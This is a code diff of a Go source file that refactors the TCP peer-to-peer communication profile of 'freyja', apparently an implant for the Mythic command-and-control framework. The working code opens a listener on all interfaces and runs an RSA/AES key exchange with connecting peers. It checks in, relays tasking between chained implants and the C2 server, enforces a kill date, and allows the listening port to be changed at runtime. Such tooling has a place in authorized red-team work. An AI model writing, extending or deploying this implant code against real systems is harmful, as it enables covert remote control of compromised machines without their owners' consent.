@@ -1,5 +1,4 @@
-// +build linux darwin
-// +build freyja_tcp
+//go:build (linux || darwin || windows) && freyja_tcp
 
 package profiles
 
@@ -12,11 +11,15 @@ import (
 	"io"
 	"net"
 	"os"
+	"sync"
 	"time"
+
+	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/responses"
+	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils"
 
 	"github.com/google/uuid"
 
-	// freyja
+	// Freyja
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/crypto"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
@@ -24,44 +27,56 @@ import (
 // All variables must be a string so they can be set with ldflags
 
 // port to listen on
-var port string
+var freyja_tcp_port string
 
 // killdate is the Killdate
-var killdate string
+var freyja_tcp_killdate string
 
 // encrypted_exchange_check is Perform Key Exchange
-var encrypted_exchange_check string
+var freyja_tcp_encrypted_exchange_check string
 
 // AESPSK is the Crypto type
-var AESPSK string
+var freyja_tcp_AESPSK string
 
-type C2Default struct {
-	ExchangingKeys       bool
-	Key                  string
-	RsaPrivateKey        *rsa.PrivateKey
-	Port                 string
-	EgressTCPConnections map[string]net.Conn
-	FinishedStaging      bool
-	Killdate             time.Time
+type C2FreyjaTCP struct {
+	ExchangingKeys       bool                `json:"ExchangingKeys"`
+	Key                  string              `json:"Key"`
+	RsaPrivateKey        *rsa.PrivateKey     `json:"RsaPrivateKey"`
+	Port                 string              `json:"Port"`
+	EgressTCPConnections map[string]net.Conn `json:"-"`
+	FinishedStaging      bool                `json:"FinishedStaging"`
+	Killdate             time.Time           `json:"Killdate"`
+	egressLock           sync.RWMutex
+	ShouldStop           bool `json:"ShouldStop"`
+	stoppedChannel       chan bool
+	PushChannel          chan structs.MythicMessage `json:"-"`
+	stopListeningChannel chan bool
 }
 
-func New() structs.Profile {
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
+func init() {
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", freyja_tcp_killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		os.Exit(1)
 	}
-	profile := C2Default{
-		Key:                  AESPSK,
-		Port:                 port,
-		ExchangingKeys:       encrypted_exchange_check == "T",
+	profile := C2FreyjaTCP{
+		Key:                  freyja_tcp_AESPSK,
+		Port:                 freyja_tcp_port,
+		ExchangingKeys:       freyja_tcp_encrypted_exchange_check == "true",
 		EgressTCPConnections: make(map[string]net.Conn),
 		FinishedStaging:      false,
 		Killdate:             killDateTime,
+		ShouldStop:           false,
+		stoppedChannel:       make(chan bool, 1),
+		PushChannel:          make(chan structs.MythicMessage, 100),
+		stopListeningChannel: make(chan bool, 1),
 	}
-	return &profile
+	// these two functions only need to happen once, not each time the profile is started
+	go profile.CreateMessagesForEgressConnections()
+	go profile.CheckForKillDate()
+	RegisterAvailableC2Profile(&profile)
 }
-func (c *C2Default) CheckForKillDate() {
+func (c *C2FreyjaTCP) CheckForKillDate() {
 	for true {
 		time.Sleep(time.Duration(10) * time.Second)
 		today := time.Now()
@@ -70,52 +85,114 @@ func (c *C2Default) CheckForKillDate() {
 		}
 	}
 }
-func (c *C2Default) Start() {
+func (c *C2FreyjaTCP) Start() {
 	// start listening
-	listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))
-	if err != nil {
-		fmt.Println("Failed to bind")
-		return
+	var listen net.Listener
+	var err error
+	c.ShouldStop = false
+	go func() {
+		<-c.stopListeningChannel
+		listen.Close()
+		c.stoppedChannel <- true
+	}()
+	for {
+		listen, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))
+
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
+			time.Sleep(1 * time.Second)
+		}
+		utils.PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
+		if c.ShouldStop {
+			return
+		}
+		break
 	}
-	defer listen.Close()
+
 	//fmt.Printf("Started listening...\n")
-	go c.CreateMessagesForEgressConnections()
-	go c.CheckForKillDate()
 	for {
 		conn, err := listen.Accept()
 		if err != nil {
 			fmt.Println("Failed to accept connection")
-			continue
+			return
 		}
 		go c.handleClientConnection(conn)
 	}
 }
-func (c *C2Default) handleClientConnection(conn net.Conn) {
+func (c *C2FreyjaTCP) Stop() {
+	if c.ShouldStop {
+		return
+	}
+	c.ShouldStop = true
+	c.stopListeningChannel <- true
+	utils.PrintDebug("issued stop to freyja_tcp\n")
+	<-c.stoppedChannel
+	utils.PrintDebug("freyja_tcp fully stopped\n")
+}
+func (c *C2FreyjaTCP) GetConfig() string {
+	jsonString, err := json.MarshalIndent(c, "", "  ")
+	if err != nil {
+		return fmt.Sprintf("Failed to get config: %v\n", err)
+	}
+	return string(jsonString)
+}
+func (c *C2FreyjaTCP) IsRunning() bool {
+	return !c.ShouldStop
+}
+func (c *C2FreyjaTCP) SetEncryptionKey(newKey string) {
+	c.Key = newKey
+	c.FinishedStaging = true
+	c.ExchangingKeys = false
+}
+func (c *C2FreyjaTCP) UpdateConfig(parameter string, value string) {
+	switch parameter {
+	case "Killdate":
+		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
+		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+		if err == nil {
+			c.Killdate = killDateTime
+		}
+	case "Port":
+		c.Port = value
+		c.Stop()
+		go c.Start()
+	default:
+
+	}
+}
+func (c *C2FreyjaTCP) GetPushChannel() chan structs.MythicMessage {
+	if !c.ShouldStop {
+		return c.PushChannel
+	}
+	return nil
+}
+func (c *C2FreyjaTCP) handleClientConnection(conn net.Conn) {
 	// this is a new client connection to this listening server
 	// first thing we want to do is save it off
 	connectionUUID := uuid.New().String()
 	c.EgressTCPConnections[connectionUUID] = conn
 	go c.handleEgressConnectionIncomingMessage(conn)
 	if c.FinishedStaging {
-		fmt.Printf("FinishedStaging, Got a new connection, sending checkin\n")
+		utils.PrintDebug(fmt.Sprintf("FinishedStaging, Got a new connection, sending checkin\n"))
 		go c.CheckIn()
 	} else if c.ExchangingKeys {
-		fmt.Printf("ExchangingKeys, starting EKE\n")
+		//fmt.Printf("ExchangingKeys, starting EKE\n")
 		go c.NegotiateKey()
 	} else {
-		fmt.Printf("Not finished staging, not exchaing keys, sending checkin\n")
+		//fmt.Printf("Not finished staging, not exchanging keys, sending checkin\n")
 		go c.CheckIn()
 	}
 }
-func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
+func (c *C2FreyjaTCP) handleEgressConnectionIncomingMessage(conn net.Conn) {
 	// These are normally formatted messages for our agent
 	// in normal base64 format with our uuid, parse them as such
 	var sizeBuffer uint32
+	var enc_raw []byte
 	//fmt.Printf("handleEgressConnectionIncomingMessage started\n")
 	for {
 		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
 		if err != nil {
-			fmt.Println("Failed to read size from tcp connection:", err)
+			//fmt.Println("Failed to read size from tcp connection:", err)
 			if err == io.EOF {
 				// the connection is broken, we should remove this entry from our egress map
 				c.RemoveEgressTCPConnectionByConnection(conn)
@@ -127,7 +204,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 
 			readSoFar, err := conn.Read(readBuffer)
 			if err != nil {
-				fmt.Println("Failed to read bytes from tcp connection:", err)
+				//fmt.Println("Failed to read bytes from tcp connection:", err)
 				if err == io.EOF {
 					// the connection is broken, we should remove this entry from our egress map
 					c.RemoveEgressTCPConnectionByConnection(conn)
@@ -140,7 +217,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				nextBuffer := make([]byte, sizeBuffer-totalRead)
 				readSoFar, err = conn.Read(nextBuffer)
 				if err != nil {
-					fmt.Println("Failed to read bytes from tcp connection:", err)
+					//fmt.Println("Failed to read bytes from tcp connection:", err)
 					if err == io.EOF {
 						// the connection is broken, we should remove this entry from our egress map
 						c.RemoveEgressTCPConnectionByConnection(conn)
@@ -150,36 +227,32 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				copy(readBuffer[totalRead:], nextBuffer)
 				totalRead = totalRead + uint32(readSoFar)
 			}
-			//fmt.Printf("Read %d bytes from connection\n", totalRead)
-			raw, err := base64.StdEncoding.DecodeString(string(readBuffer))
-			if err != nil {
-				//log.Println("Error decfreyjag base64 data: ", err.Error())
+			utils.PrintDebug(fmt.Sprintf("Read %d bytes from p2p connection\n", totalRead))
+			if raw, err := base64.StdEncoding.DecodeString(string(readBuffer)); err != nil {
+				//log.Println("Error decoding base64 data: ", err.Error())
 				continue
-			}
-
-			if len(raw) < 36 {
+			} else if len(raw) < 36 {
 				continue
-			}
-
-			enc_raw := raw[36:] // Remove the Payload UUID
-			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
-			if len(c.Key) != 0 {
+			} else if len(c.Key) != 0 {
 				//log.Println("just did a post, and decrypting the message back")
-				enc_raw = c.decryptMessage(enc_raw)
+				enc_raw = c.decryptMessage(raw[36:])
 				//log.Println(enc_raw)
 				if len(enc_raw) == 0 {
 					// failed somehow in decryption
 					continue
 				}
+			} else {
+				enc_raw = raw[36:]
 			}
+			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
 			if c.FinishedStaging {
 				taskResp := structs.MythicMessageResponse{}
 				err = json.Unmarshal(enc_raw, &taskResp)
 				if err != nil {
 					fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
 				}
-				//fmt.Printf("Raw message from mythic: %s\n", string(enc_raw))
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				utils.PrintDebug(fmt.Sprintf("Raw message from mythic: %s\n", string(enc_raw)))
+				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 			} else {
 				if c.ExchangingKeys {
 					// this will be our response to the initial staging message
@@ -197,33 +270,37 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 						SetMythicID(checkinResp.ID)
 						c.FinishedStaging = true
 					} else {
-						fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
+						//fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
 					}
 				}
 			}
-
 		}
 	}
 }
 
-func (c *C2Default) ProfileType() string {
-	return "tcp"
+func (c *C2FreyjaTCP) ProfileName() string {
+	return "freyja_tcp"
+}
+func (c *C2FreyjaTCP) IsP2P() bool {
+	return true
 }
 
 // CheckIn - either a new agent or a new client connection, do the same for both
-func (c *C2Default) CheckIn() interface{} {
+func (c *C2FreyjaTCP) CheckIn() structs.CheckInMessageResponse {
 	checkin := CreateCheckinMessage()
-
+	response := structs.CheckInMessageResponse{}
 	raw, err := json.Marshal(checkin)
 	if err != nil {
 		fmt.Printf("Failed to marshal checkin message\n")
-		return false
+		response.Status = "error"
+		return response
 	}
-	return c.SendMessage(raw)
-
+	c.SendMessage(raw)
+	response.Status = "success"
+	return response
 }
 
-func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
+func (c *C2FreyjaTCP) FinishNegotiateKey(resp []byte) bool {
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
 	err := json.Unmarshal(resp, &sessionKeyResp)
@@ -243,9 +320,9 @@ func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
 	return true
 }
 
-//NegotiateKey - EKE key negotiation
-func (c *C2Default) NegotiateKey() bool {
-	sessionID := GenerateSessionID()
+// NegotiateKey - EKE key negotiation
+func (c *C2FreyjaTCP) NegotiateKey() bool {
+	sessionID := utils.GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	// Replace struct with dynamic json
@@ -261,11 +338,12 @@ func (c *C2Default) NegotiateKey() bool {
 		return false
 	}
 
-	return c.SendMessage(raw).(bool)
+	c.SendMessage(raw)
+	return true
 }
 
-//htmlPostData HTTP POST function
-func (c *C2Default) SendMessage(sendData []byte) interface{} {
+// htmlPostData HTTP POST function
+func (c *C2FreyjaTCP) SendMessage(sendData []byte) []byte {
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
 		//log.Printf("Encrypting Post data")
@@ -293,7 +371,7 @@ func (c *C2Default) SendMessage(sendData []byte) interface{} {
 		for _, connectionUUID := range keys {
 			err := binary.Write(c.EgressTCPConnections[connectionUUID], binary.BigEndian, uint32(len(sendData)))
 			if err != nil {
-				fmt.Printf("Failed to send down pipe with error: %v\n", err)
+				utils.PrintDebug(fmt.Sprintf("Failed to send down pipe with error: %v\n", err))
 				// need to make sure we track that this egress connection is dead and should be removed
 				c.RemoveEgressTCPConnection(connectionUUID)
 				time.Sleep(200 * time.Millisecond)
@@ -301,55 +379,38 @@ func (c *C2Default) SendMessage(sendData []byte) interface{} {
 			}
 			_, err = c.EgressTCPConnections[connectionUUID].Write(sendData)
 			if err != nil {
-				fmt.Printf("Failed to send with error: %v\n", err)
+				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
 				// need to make sure we track that this egress connection is dead and should be removed
 				c.RemoveEgressTCPConnection(connectionUUID)
 				time.Sleep(200 * time.Millisecond)
 				continue
 			}
-			//fmt.Printf("Sent %d bytes to connection\n", totalWritten)
-			return true
+			//PrintDebug(fmt.Sprintf("Sent %d bytes to connection\n", totalWritten))
+			return nil
 		}
 		// if we get here it means we have no more active egress connections, so we can't send it anywhere useful
 		time.Sleep(200 * time.Millisecond)
 	}
 }
-func (c *C2Default) HandleDelegateMessageForInternalConnections(delegates []structs.DelegateMessage) {
-	// got a message that needs to go to one of the c.InternalConnections
-	// parse the delegate message and then switch based on UUID
-	for i := 0; i < len(delegates); i++ {
-		if conn, ok := InternalTCPConnections[delegates[i].UUID]; ok {
-			//fmt.Printf("Got message for %s: %v\n", delegates[i].UUID, delegates[i].Message)
-			_, err := conn.Write([]byte(delegates[i].Message))
-			if err != nil {
-				fmt.Printf("Failed to write to delegate connection: %v\n", err)
-				// need to remove the connection and send a message back to Mythic about it
-			}
-		}
-	}
-	return
-}
-func (c *C2Default) CreateMessagesForEgressConnections() {
+
+func (c *C2FreyjaTCP) CreateMessagesForEgressConnections() {
 	// got a message that needs to go to one of the c.ExternalConnection
 	for {
-		msg := CreateMythicMessage()
-
-		if msg.Delegates != nil || msg.Socks != nil || msg.Responses != nil || msg.Edges != nil {
-			//fmt.Printf("Checking to see if there's anything to send to Mythic:\n%v\n", msg)
-			// we need to get this message ready to send
-			raw, err := json.Marshal(msg)
-			if err != nil {
-				fmt.Printf("Failed to marshal message to Mythic: %v\n", err)
-				continue
-			}
-			//fmt.Printf("Sending message outbound to http: %v\n", msg)
-			c.SendMessage(raw)
+		msg := <-c.PushChannel
+		raw, err := json.Marshal(msg)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
+			continue
 		}
-		time.Sleep(200 * time.Millisecond)
+		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
+		c.SendMessage(raw)
 	}
 }
 
-func (c *C2Default) RemoveEgressTCPConnection(connectionUUID string) bool {
+func (c *C2FreyjaTCP) RemoveEgressTCPConnection(connectionUUID string) bool {
+	c.egressLock.Lock()
+	defer c.egressLock.Unlock()
+	utils.PrintDebug(fmt.Sprintf("removing egress connection: %s\n", connectionUUID))
 	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
 		conn.Close()
 		delete(c.EgressTCPConnections, connectionUUID)
@@ -358,35 +419,45 @@ func (c *C2Default) RemoveEgressTCPConnection(connectionUUID string) bool {
 	return false
 }
 
-func (c *C2Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
+func (c *C2FreyjaTCP) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
+	c.egressLock.Lock()
+	defer c.egressLock.Unlock()
+	utils.PrintDebug(fmt.Sprintf("removing egress connection\n"))
 	for connectionUUID, conn := range c.EgressTCPConnections {
 		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
 			// found the match, remove it and break
-			c.RemoveEgressTCPConnection(connectionUUID)
+			conn.Close()
+			delete(c.EgressTCPConnections, connectionUUID)
+			//c.RemoveEgressTCPConnection(connectionUUID)
 			return true
 		}
 	}
 	return false
 }
 
-func (c *C2Default) encryptMessage(msg []byte) []byte {
+func (c *C2FreyjaTCP) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
-func (c *C2Default) decryptMessage(msg []byte) []byte {
+func (c *C2FreyjaTCP) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	//fmt.Printf("Decrypting with key: %s\n", hex.EncodeToString(key))
+	//fmt.Printf("Decrypting message: %s\n", hex.EncodeToString(msg))
 	return crypto.AesDecrypt(key, msg)
 }
 
-func (c *C2Default) SetSleepInterval(interval int) string {
-	return fmt.Sprintf("Sleep interval not used for TCP P2P Profile\n")
+func (c *C2FreyjaTCP) SetSleepInterval(interval int) string {
+	return fmt.Sprintf("Sleep interval not used for freyja_tcp P2P Profile\n")
 }
 
-func (c *C2Default) SetSleepJitter(jitter int) string {
-	return fmt.Sprintf("Sleep Jitter not used for TCP P2P Profile\n")
+func (c *C2FreyjaTCP) SetSleepJitter(jitter int) string {
+	return fmt.Sprintf("Sleep Jitter not used for freyja_tcp P2P Profile\n")
 }
 
-func (c *C2Default) GetSleepTime() int {
+func (c *C2FreyjaTCP) GetSleepTime() int {
+	if c.ShouldStop {
+		return -1
+	}
 	return 0
 }
